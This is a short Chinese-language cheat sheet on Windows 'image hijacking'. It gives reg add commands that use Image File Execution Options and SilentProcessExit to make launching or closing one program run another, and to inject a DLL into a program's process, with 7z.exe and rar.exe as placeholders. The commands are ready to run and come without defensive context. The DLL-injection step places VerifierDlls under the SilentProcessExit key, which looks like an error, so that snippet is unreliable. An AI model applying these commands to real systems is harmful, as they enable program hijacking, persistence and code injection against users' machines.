# Windows 映像劫持
* 有程序 `7z.exe` ,双击运行它之后,实际运行的却是 `rar.exe`, `7z.exe` 会以参数形式传递给 `rar.exe`
    ```cmd
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\7z.exe" /t REG_SZ /v Debugger /d "C:\rar.exe" /f
    ```
* 程序 `7z.exe` 已经在运行,关闭它后,自动启动 `rar.exe`
    ```cmd
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\7z.exe" /t REG_DWORD /v GlobalFlag /d 512 /f /reg:32
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\7z.exe" /t REG_DWORD /v ReportingMode  /d 1 /f /reg:32
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\7z.exe" /t REG_SZ /v MonitorProcess /d "C:\rar.exe" /f /reg:32
    ```
* 有程序 `7z.exe` ,启动它时,注入 `rar.dll` ,须将dll放入 `C:\Windows\SysWOW64` 或 `C:\Windows\System32` 目录下
    ```cmd
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\7z.exe" /t REG_DWORD /v GlobalFlag /d 256 /f
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\7z.exe" /t REG_SZ /v VerifierDlls /d "rar.dll" /f
    ```